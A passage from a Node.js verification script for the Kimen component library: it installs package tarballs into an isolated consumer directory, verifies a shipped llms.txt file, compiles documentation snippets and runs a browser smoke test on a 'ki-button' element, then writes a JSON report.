        new Promise((resolveFrame) =>
          globalThis.requestAnimationFrame(() => globalThis.queueMicrotask(resolveFrame)),
        ),
    );
    if (pageErrors.length > 0) {
      fail(`browser page error or unhandled rejection: ${pageErrors.join(' | ')}`);
    }
    await page.waitForFunction(() => globalThis.customElements.get('ki-button') !== undefined);
    await page.evaluate(() => {
      if (!globalThis.document.querySelector('ki-button')) {
        const button = globalThis.document.createElement('ki-button');
        button.textContent = 'Continue';
        globalThis.document.body.append(button);
      }
    });
    await page.waitForFunction(() => globalThis.document.querySelector('ki-button')?.shadowRoot);
    const observation = await page.evaluate(() => {
      const host = globalThis.document.querySelector('ki-button');
      const button = host?.shadowRoot?.querySelector('button');
      const style =
        button === null || button === undefined ? null : globalThis.getComputedStyle(button);
      const backgroundColor = style?.backgroundColor ?? null;
      const color = style?.color ?? null;
      globalThis.document.documentElement.style.setProperty(
        '--ki-button-secondary-neutral-rest-bg',
        'rgb(1, 2, 3)',
      );
      globalThis.document.documentElement.style.setProperty(
        '--ki-button-secondary-neutral-rest-fg',
        'rgb(254, 253, 252)',
      );
      const overriddenStyle =
        button === null || button === undefined ? null : globalThis.getComputedStyle(button);
      const overriddenBackgroundColor = overriddenStyle?.backgroundColor ?? null;
      const overriddenColor = overriddenStyle?.color ?? null;
      return {
        tagName: host?.tagName.toLowerCase() ?? null,
        customElementDefined: globalThis.customElements.get('ki-button') !== undefined,
        shadowButtonRendered: button !== null && button !== undefined,
        executedSnippetCount: Object.entries(globalThis.document.documentElement.dataset).filter(
          ([name, value]) => name.startsWith('kimenSnippet') && value === 'executed',
        ).length,
        backgroundColor,
        color,
        overriddenBackgroundColor,
        overriddenColor,
      };
    });
    return requirePassingBrowserEvidence(
      createBrowserEvidence(observation, {
        engine,
        httpRequestPolicyEnforced: deniedProbeUrls.every((url) => blockedRequests.has(url)),
        sentinelsResolved: themeSentinels.resolved,
        webSocketPolicyEnforced: blockedWebSockets.has(deniedWebSocketUrl),
      }),
      expectedSnippetCount,
    );
  } finally {
    await browser.close();
  }
}

function installRuntime(overrides) {
  return { lstat, mkdir, readdir, realpath, runCommand, writeFile, ...overrides };
}

export async function installTarballs(options, installationExamples, overrides = {}) {
  const runtime = installRuntime(overrides);
  const consumerPath = options['consumer-dir'];
  const existingConsumer = await runtime.lstat(consumerPath).catch((error) => {
    if (error?.code === 'ENOENT') {
      return null;
    }
    throw error;
  });
  if (existingConsumer?.isSymbolicLink()) {
    fail('consumer directory must not be a symbolic link');
  }
  if (existingConsumer !== null && !existingConsumer.isDirectory()) {
    fail('consumer directory must be a directory');
  }
  await runtime.mkdir(consumerPath, { recursive: true });
  if ((await runtime.readdir(consumerPath)).length !== 0) {
    fail('consumer directory must be empty for a clean tarball install');
  }
  await runtime.mkdir(options['cache-dir'], { recursive: true });
  const consumerRealpath = await runtime.realpath(consumerPath);
  const cacheRealpath = await runtime.realpath(options['cache-dir']);
  const workspaceRealpath = await runtime.realpath(repositoryRoot);
  const fromWorkspace = relative(workspaceRealpath, consumerRealpath);
  if (
    fromWorkspace === '' ||
    (!fromWorkspace.startsWith(`..${sep}`) && fromWorkspace !== '..' && !isAbsolute(fromWorkspace))
  ) {
    fail('consumer directory must be outside the workspace');
  }
  const cacheFromConsumer = relative(consumerRealpath, cacheRealpath);
  if (
    cacheFromConsumer === '' ||
    (!cacheFromConsumer.startsWith(`..${sep}`) &&
      cacheFromConsumer !== '..' &&
      !isAbsolute(cacheFromConsumer))
  ) {
    fail('cache directory must be outside the clean consumer directory');
  }
  await runtime.writeFile(
    join(consumerRealpath, 'package.json'),
    `${JSON.stringify({ name: 'kimen-clean-consumer', private: true, type: 'module' }, null, 2)}\n`,
  );
  const npmCache = join(options['cache-dir'], 'npm');
  const pnpmStore = join(options['cache-dir'], 'pnpm-store');
  const xdgCache = join(options['cache-dir'], 'xdg');
  const environment = {
    ...process.env,
    COREPACK_HOME: process.env.COREPACK_HOME ?? join(options['cache-dir'], 'corepack'),
    NPM_CONFIG_AUDIT: 'false',
    NPM_CONFIG_CACHE: npmCache,
    NPM_CONFIG_FUND: 'false',
    NPM_CONFIG_IGNORE_SCRIPTS: 'true',
    NPM_CONFIG_OFFLINE: 'true',
    NPM_CONFIG_STORE_DIR: pnpmStore,
    PNPM_HOME: process.env.PNPM_HOME ?? join(options['cache-dir'], 'pnpm-home'),
    XDG_CACHE_HOME: xdgCache,
    npm_config_audit: 'false',
    npm_config_cache: npmCache,
    npm_config_fund: 'false',
    npm_config_ignore_scripts: 'true',
    npm_config_offline: 'true',
    npm_config_store_dir: pnpmStore,
  };
  await Promise.all(
    [
      environment.COREPACK_HOME,
      environment.PNPM_HOME,
      environment.XDG_CACHE_HOME,
      environment.npm_config_cache,
      environment.npm_config_store_dir,
    ].map((directory) => runtime.mkdir(directory, { recursive: true })),
  );
  const tarballsByPackage = new Map([
    ['@kimen/elements', options['elements-tarball']],
    ['@kimen/tokens', options['tokens-tarball']],
  ]);
  const installationRuns = [];
  for (const example of installationExamples) {
    const invocation = createInstallInvocation(example, tarballsByPackage);
    runtime.runCommand(invocation.executable, invocation.arguments, {
      cwd: consumerRealpath,
      env: environment,
    });
    installationRuns.push({
      command: example.command,
      manager: invocation.executable,
      status: 'passed',
    });
  }
  return { consumerDirectory: consumerRealpath, installationRuns };
}

export function consumerRuntime(overrides = {}) {
  return {
    assertImportsAreExported,
    compileSnippets,
    installTarballs,
    loadInstalledPackage,
    mkdir,
    readFile,
    readPackedLlmsFromTarball,
    realpath,
    requireRegularFile,
    runBrowserSmoke,
    selectBrowserEngine: selectedBrowserEngine,
    writeFile,
    ...overrides,
  };
}

export async function executeConsumerContract(options, overrides = {}) {
  const runtime = consumerRuntime(overrides);
  const engine = runtime.selectBrowserEngine();
  await Promise.all([
    runtime.requireRegularFile(options['elements-tarball'], 'elements tarball'),
    runtime.requireRegularFile(options['tokens-tarball'], 'tokens tarball'),
    runtime.requireRegularFile(options.llms, 'llms.txt'),
    runtime.mkdir(dirname(options.report), { recursive: true }),
  ]);
  const [providedLlmsBytes, archiveLlmsBytes] = await Promise.all([
    runtime.readFile(options.llms),
    Promise.resolve(runtime.readPackedLlmsFromTarball(options['elements-tarball'])),
  ]);
  if (!providedLlmsBytes.equals(archiveLlmsBytes)) {
    fail('llms.txt bytes do not match the guidance shipped in the elements tarball');
  }
  const packedLlms = decodeUtf8(archiveLlmsBytes, 'packed llms.txt');
  const installationExamples = extractInstallExamples(packedLlms);
  const { consumerDirectory, installationRuns } = await runtime.installTarballs(
    options,
    installationExamples,
  );
  const installedPackages = new Map(
    await Promise.all(
      ['@kimen/elements', '@kimen/tokens'].map(async (name) => [
        name,
        await runtime.loadInstalledPackage(consumerDirectory, name),
      ]),
    ),
  );
  const packageReport = [];
  const workspacePhysical = await runtime.realpath(repositoryRoot);
  for (const name of ['@kimen/elements', '@kimen/tokens']) {
    const physicalPath = await runtime.realpath(installedPackages.get(name).packageRoot);
    const fromWorkspace = relative(workspacePhysical, physicalPath);
    const workspaceLinked =
      fromWorkspace === '' ||
      (!fromWorkspace.startsWith(`..${sep}`) &&
        fromWorkspace !== '..' &&
        !isAbsolute(fromWorkspace));
    if (workspaceLinked) {
      fail(`installed package ${name} resolves into the source workspace`);
    }
    packageReport.push({ name, source: 'tarball', workspaceLinked: false });
  }
  const elements = installedPackages.get('@kimen/elements');
  const packedLlmsPath = join(elements.packageRoot, 'llms.txt');
  await runtime.requireRegularFile(packedLlmsPath, 'packed llms.txt');
  const installedLlmsBytes = await runtime.readFile(packedLlmsPath);
  if (!archiveLlmsBytes.equals(installedLlmsBytes)) {
    fail('installed llms.txt bytes do not match the elements tarball entry');
  }
  const executableSnippets = extractExecutableSnippets(packedLlms);
  const snippetSources = executableSnippets.map(({ source }) => source);
  await runtime.assertImportsAreExported(snippetSources, installedPackages);
  const snippetContract = browserSnippetContract(snippetSources);
  const snippetReport = await runtime.compileSnippets(
    executableSnippets,
    consumerDirectory,
    installedPackages,
  );
  const browser = await runtime.runBrowserSmoke({
    browserSource: executableBrowserSnippets(snippetSources, snippetContract.tokenCssSpecifier),
    consumerDirectory,
    elementSpecifier: snippetContract.elementSpecifier,
    engine,
    expectedSnippetCount: executableSnippets.length,
    installedPackages,
    tokenCssSpecifier: snippetContract.tokenCssSpecifier,
  });
  const report = {
    schemaVersion: 1,
    installationExamples,
    installationRuns,
    packages: packageReport,
    snippets: snippetReport,
    browser,
  };
  await runtime.writeFile(options.report, `${JSON.stringify(report, null, 2)}\n`, 'utf8');
  return report;
}

export async function runConsumerContractCli(argv, overrides = {}) {
  return executeConsumerContract(parseArguments(argv), overrides);
}

export function isDirectExecution(argvPath, moduleUrl = import.meta.url) {
  return typeof argvPath === 'string' && resolve(argvPath) === fileURLToPath(moduleUrl);
}

if (isDirectExecution(process.argv[1])) {
  runConsumerContractCli(process.argv.slice(2)).catch((error) => {
    process.stderr.write(`${error.message}\n`);
    process.exitCode = 1;
  });
}
